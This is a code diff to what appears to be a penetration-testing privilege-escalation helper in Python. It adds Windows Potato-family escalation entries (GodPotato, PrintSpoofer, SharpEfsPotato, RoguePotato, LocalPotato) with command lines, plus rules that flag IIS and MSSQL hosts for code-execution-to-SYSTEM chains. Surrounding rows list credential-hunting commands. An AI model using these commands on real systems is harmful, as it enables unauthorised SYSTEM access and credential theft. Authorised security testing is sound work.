@@ -30,8 +30,26 @@ WINDOWS_VECTORS = [
     ("AlwaysInstallElevated", "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\"
      "Windows\\Installer /v AlwaysInstallElevated",
      "If 1 (both HKLM+HKCU) -> install a malicious MSI as SYSTEM."),
-    ("Token privileges", "whoami /priv",
-     "SeImpersonate/SeAssignPrimaryToken -> Potato family to SYSTEM."),
+    ("Token privileges (whoami /priv)", "whoami /priv",
+     "SeImpersonate or SeAssignPrimaryToken held? Typical for IIS/MSSQL/service "
+     "accounts (NT SERVICE\\*, NETWORK/LOCAL SERVICE). If yes -> Potato to SYSTEM "
+     "(see the Potato rows)."),
+    ("Potato -> SYSTEM (patched Win10/11 & Server 2016-2022)",
+     "GodPotato -cmd \"cmd /c whoami\"  |  PrintSpoofer64.exe -i -c cmd  |  "
+     "SharpEfsPotato.exe -p C:\\Windows\\System32\\cmd.exe -a whoami",
+     "Still work on fully-patched builds because they abuse SeImpersonate (not a "
+     "patchable bug): GodPotato / SigmaPotato (DCOM/RPC, most reliable), "
+     "PrintSpoofer (spooler named pipe), EfsPotato / SharpEfsPotato (MS-EFSR), "
+     "JuicyPotatoNG (CLSID). RottenPotato & classic JuicyPotato are dead on "
+     "current builds."),
+    ("Potato: network / DCOM variants",
+     "RoguePotato.exe -r <redirector-ip> -e cmd -l 9999  ;  DCOMPotato",
+     "RoguePotato when the OXID resolver (tcp/135) can reach a redirector you "
+     "control; DCOMPotato targets specific DCOM services still abusable when "
+     "patched."),
+    ("LocalPotato (CVE-2023-21746)", "LocalPotato.exe  (local NTLM reflection)",
+     "Local NTLM EoP -> arbitrary file write as SYSTEM; chain a DLL/service "
+     "hijack for code exec if the host isn't fully mitigated."),
     ("Stored credentials", "cmdkey /list ; reg query HKLM /f password /t "
      "REG_SZ /s ; type unattend.xml / sysprep.inf",
      "Look for saved/plaintext creds and autologon."),
@@ -109,6 +127,22 @@ def remote_findings(host: Host) -> list[dict]:
     if host.smb_signing == "not required":
         add("SMB signing not required",
             "Relay captured/coerced auth (ntlmrelayx) to this host", "")
+
+    # Services whose account usually holds SeImpersonate -> a Potato lands SYSTEM
+    # if you get code exec here (webshell, xp_cmdshell, deserialization...).
+    for p in host.open_ports:
+        svc, prod = (p.service or "").lower(), (p.product or "").lower()
+        if "microsoft-iis" in prod or ("http" in svc and "iis" in prod):
+            add("IIS service - AppPool identity likely holds SeImpersonate",
+                f"port {p.portid}: RCE as the AppPool -> Potato (GodPotato/"
+                f"PrintSpoofer) -> SYSTEM")
+            break
+    for p in host.open_ports:
+        if p.portid == 1433 or "ms-sql" in (p.service or "").lower():
+            add("MSSQL service - service account likely holds SeImpersonate",
+                f"port {p.portid}: code exec (xp_cmdshell) -> Potato (GodPotato/"
+                f"PrintSpoofer) -> SYSTEM")
+            break
 
     # Local-exploit candidates from searchsploit on service versions.
     for e in host.exploits:
